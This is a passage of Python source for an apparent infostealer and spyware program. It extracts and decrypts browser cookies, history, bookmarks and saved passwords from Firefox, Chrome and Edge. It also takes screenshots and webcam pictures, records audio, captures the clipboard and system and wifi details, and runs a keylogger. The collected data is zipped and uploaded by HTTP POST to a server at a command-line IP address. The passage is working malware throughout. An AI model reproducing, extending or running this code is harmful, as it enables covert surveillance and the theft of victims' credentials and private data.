        # Open the output file to write cookies data
        with open(output_file, "w", encoding="utf-8") as firefox_cookies_data:
            # Iterate over each cookie record in the database
            for row in cursor.fetchall():
                name, value, host, path, expiry = row
                # Write cookie details to the output file     
                firefox_cookies_data.write(f"Host: {host}\n")
                firefox_cookies_data.write(f"Cookie Name: {name}\n")
                firefox_cookies_data.write(f"Cookie Value (decrypted): {value}\n")
                firefox_cookies_data.write("=" * 50 + "\n\n")

        # Close the connection after extraction
        cursor.close()
        db.close()
        logging.info("Firefox cookies extraction completed.")
    # Exception handling blocks
    except FileNotFoundError as e:
        logging.error(f"File not found error: {e}")
    except Exception as e:
        logging.error(f"Error extracting Firefox cookies: {e}")
    # Final cleanup block
    finally:
        if db:
            db.close()
        try:
            os.remove(temp_db_path)
        except Exception as e:
            logging.error(f"Error cleaning up temporary files: {e}")

# Function to extract Firefox history
def extract_firefox_history(output_file):
    logging.info("Firefox history extraction process started.")

    # Define the path to Firefox profiles
    firefox_profile_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")

    # Identify the path of the history database in the default profile
    db_path = None
    for profile in os.listdir(firefox_profile_path):
        if profile.endswith('.default-release'):
            db_path = os.path.join(firefox_profile_path, profile, "places.sqlite")
            break

    # Check if the history database file exists
    if not os.path.isfile(db_path):
        logging.error("Firefox history database does not exist.")
        return

    # Create a temporary copy of the database to avoid locking issues
    temp_db_path = os.path.join(firefox_profile_path, "temp_FirefoxHistory.db")
    shutil.copyfile(db_path, temp_db_path)

    try:
        # Connect to the temporary database copy
        db = sqlite3.connect(temp_db_path)
        cursor = db.cursor()
        
        # SQL query to fetch browsing history from the database
        query = "SELECT url, title, visit_date FROM moz_places, moz_historyvisits WHERE moz_places.id = moz_historyvisits.place_id"
        cursor.execute(query)

        # Open the output file to write history data
        with open(output_file, "w", encoding="utf-8") as firefox_history_data:            
            for url, title, visit_date in cursor.fetchall():
                # Write history details to the output file
                firefox_history_data.write(f"URL: {url}\n")
                firefox_history_data.write(f"Title: {title}\n")
                firefox_history_data.write(f"Last Visit: {get_firefox_datetime(visit_date)}\n")
                firefox_history_data.write("=" * 50 + "\n\n")

        # Close the connection after extraction
        cursor.close()
        db.close()
        logging.info("Firefox history extraction completed successfully.")
    # Exception handling blocks
    except PermissionError as e:
        logging.error(f"Permission error during Firefox history extraction: {e}")
    except Exception as e:
        logging.error(f"An error occurred during Firefox history extraction: {e}")
    # Final cleanup block
    finally:
        if db:
            db.close()
        try:
            os.remove(temp_db_path)
        except Exception as e:
            logging.error(f"Error cleaning up temporary files: {e}")

# Function to extract Firefox cookies
def extract_firefox_bookmarks(output_file):
    logging.info("Firefox bookmarks extraction process started.")
    # Define the path to Firefox profiles
    firefox_profile_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")

    # Identify the path of the bookmarks database in the default profile
    db_path = None
    for profile in os.listdir(firefox_profile_path):
        if profile.endswith('.default-release'):
            db_path = os.path.join(firefox_profile_path, profile, "places.sqlite")
            break

    # Check if the bookmarks file exists, log error and return if not found 
    if not os.path.isfile(db_path):
        logging.error("Firefox bookmarks database does not exist.")
        return

    # Create a temporary copy of the database to avoid locking issues
    temp_db_path = os.path.join(firefox_profile_path, "temp_FirefoxBookmarks.db")
    shutil.copyfile(db_path, temp_db_path)

    try:
        # Connect to the temporary database copy
        db = sqlite3.connect(temp_db_path)
        cursor = db.cursor()

        # SQL query to select bookmarks data from the database
        query = "SELECT moz_bookmarks.title, moz_places.url FROM moz_bookmarks JOIN moz_places ON moz_bookmarks.fk = moz_places.id WHERE moz_bookmarks.type = 1"
        cursor.execute(query)

        # Open the output file to write bookmarks data
        with open(output_file, "w", encoding="utf-8") as firefox_bookmarks_data:
            # Write each bookmark's title and URL to the output file
            for title, url in cursor.fetchall():
                firefox_bookmarks_data.write(f"Title: {title}\n")
                firefox_bookmarks_data.write(f"URL: {url}\n")
                firefox_bookmarks_data.write("=" * 50 + "\n\n")

        # Close the connection after extraction
        cursor.close()
        db.close()
        logging.info("Firefox cookies extraction completed successfully.")
    # Exception handling blocks
    except PermissionError as e:
        logging.error(f"Permission error during Firefox cookies extraction: {e}")
    except Exception as e:
        logging.error(f"An error occurred during Firefox cookies extraction: {e}")
    # Final cleanup block
    finally:
        if db:
            db.close()
        try:
            os.remove(temp_db_path)
        except Exception as e:
            logging.error(f"Error cleaning up temporary files: {e}")

# Function to extract Firefox passwords
def extract_firefox_passwords(output_file):
    logging.info("Firefox passwords extraction process started.")
    # Attempt to load the NSS library for password decryption
    try:
        nss = get_firefox_nss()
    except FileNotFoundError as e:
        # Log error and return if NSS library is not found
        logging.error(f"NSS library not found: {e}")
        return

    try:
        # Open the output file to write passwords data
        with open(output_file, mode='w', encoding='utf-8') as firefox_passwords_data:
            # Identify and process each Firefox profile
            for profile in identify_firefox_profiles(FIREFOX_PATH):
                if not os.path.isfile(profile):
                    continue

                try:
                    # Read the logins.json file for each profile
                    with open(profile) as f:
                        data = json.load(f)

                    # Decrypt and write each login's details to the output file
                    logins = data.get("logins", [])
                    for login in logins:
                        decryptedUsername = firefox_decrypt(profile, login['encryptedUsername'], nss)
                        decryptedPassword = firefox_decrypt(profile, login['encryptedPassword'], nss)
                        firefox_passwords_data.write(f"URL: {login['hostname']}\n")
                        firefox_passwords_data.write(f"Username: {decryptedUsername}\n")
                        firefox_passwords_data.write(f"Password: {decryptedPassword}\n")
                        firefox_passwords_data.write("="*80 + "\n\n")

                except Exception as e:
                    logging.error(f"Error processing Firefox profile {profile}: {e}")

    except Exception as e:
        logging.error(f"Error in Firefox passwords extraction: {e}")

    logging.info("Firefox passwords extraction completed.")

# Function to run keylogger process
def run_keylogger():
    logging.info(f"Keylogger process started.")
    with Listener(on_press=on_press) as listener:
        # Start the keylogger listener which will log keystrokes
        listener.join()

# Function to zipdirectories and files
def zip_directories_and_files(directories, output_zip_file):
    logging.info(f"Zipping process started.")
    logging.info(f"Directories to zip: {directories}")
    logging.info(f"Output zip file: {output_zip_file}")

     # Create a zip file and add specified directories and files
    with zipfile.ZipFile(output_zip_file, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for directory in directories:
            # Check if the path is a directory or file
            if os.path.isdir(directory):
                # Recursively walk through the directory
                for root, dirs, files in os.walk(directory):
                    for file in files:
                        # Exclude the zip file itself
                        if file != 'files.zip':
                            # Add each file to the zip file
                            zipf.write(os.path.join(root, file), 
                                    os.path.relpath(os.path.join(root, file), 
                                    os.path.join(directory, '..')))
            elif os.path.isfile(directory):
                # Add the file directly if it's not a directory
                zipf.write(directory, os.path.basename(directory))

    logging.info("Zipping completed.")

# List of directories to be zipped
directories_to_zip = [
    files_directory
]

# Function to parse command-line arguments
def parse_args():
    parser = argparse.ArgumentParser(description="Zip directories and upload the zip file to a server.")
    parser.add_argument('--ip', required=True, help="IP address of the server")
    return parser.parse_args()

# Main function
def main ():
    
    try:
        logging.info("Main started")
        # Start various data collection processes in separate threads
        threading.Thread(target=take_screenshot, args=(screenshots_directory,), daemon=True).start()
        threading.Thread(target=take_pictures, args=(pictures_directory,), daemon=True).start()
        threading.Thread(target=record_audio, args=(audio_directory,), daemon=True).start()
        threading.Thread(target=capture_clipboard, args=(clipboard_directory,), daemon=True).start()
        threading.Thread(target=collect_system_info, args=(system_info_file,), daemon=True).start()
        threading.Thread(target=collect_network_info, args=(network_info_file,), daemon=True).start()
        threading.Thread(target=collect_wifi_info, args=(wifi_info_file,), daemon=True).start()

        # Extract data from browsers
        extract_chrome_cookies(chrome_cookies_file)
        extract_chrome_history(chrome_history_file)
        extract_chrome_bookmarks(chrome_bookmarks_file)
        extract_chrome_passwords(chrome_passwords_file)
        
        extract_edge_cookies(edge_cookies_file)
        extract_edge_history(edge_history_file)
        extract_edge_bookmarks(edge_bookmarks_file)
        extract_edge_passwords(edge_passwords_file)

        extract_firefox_cookies(firefox_cookies_file)
        extract_firefox_history(firefox_history_file)
        extract_firefox_bookmarks(firefox_bookmarks_file)
        extract_firefox_passwords(firefox_passwords_file)
        
        # Run the keylogger
        run_keylogger()
    except Exception as e:
        logging.error(f"An error occurred: {e}")

# Entry point of the script
if __name__ == "__main__":
    freeze_support()  # Needed because pyinstall wasn't working without it
    logging.info("Script initialization")

    # Start the main function in a separate process
    p = Process(target=main)
    p.start()
    logging.info("Main process running")

    # Wait for one minute
    time.sleep(60)
    logging.info("One minute completed")

    # Terminate the process after one minute
    p.terminate()
    logging.info("Main process terminated")

    # Parse command-line arguments
    args = parse_args()
    api_ip = args.ip 

    try:
        # Zip the collected data and upload to a specified server
        zip_directories_and_files(directories_to_zip, 'C:\\Windows\\System32\\Files\\files.zip')
        logging.info("Zipping completed successfully.")

        # Define the server URL for file upload     
        url = f'http://{api_ip}:3000/upload'  # API IP (variable)
        files = {'file': open('C:\\Windows\\System32\\Files\\files.zip', 'rb')} 
        # Perform POST request to upload the file
        response = requests.post(url, files=files)
    except Exception as e:
        logging.error(f"An error occurred during zipping or file upload: {e}")
